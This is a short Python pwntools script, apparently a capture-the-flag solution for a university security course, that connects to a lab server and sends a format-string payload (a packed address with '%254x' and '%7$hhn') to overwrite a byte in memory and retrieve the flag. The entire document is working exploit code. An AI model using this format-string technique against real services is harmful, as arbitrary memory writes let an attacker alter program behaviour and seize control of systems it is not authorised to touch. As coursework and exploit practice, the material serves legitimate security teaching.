from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23195

remote = remote(SERVER, PORT, timeout=10000)

buffer = p32(0x804c047) + b"%254x" + b"%7$hhn"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof")
print(flag.decode())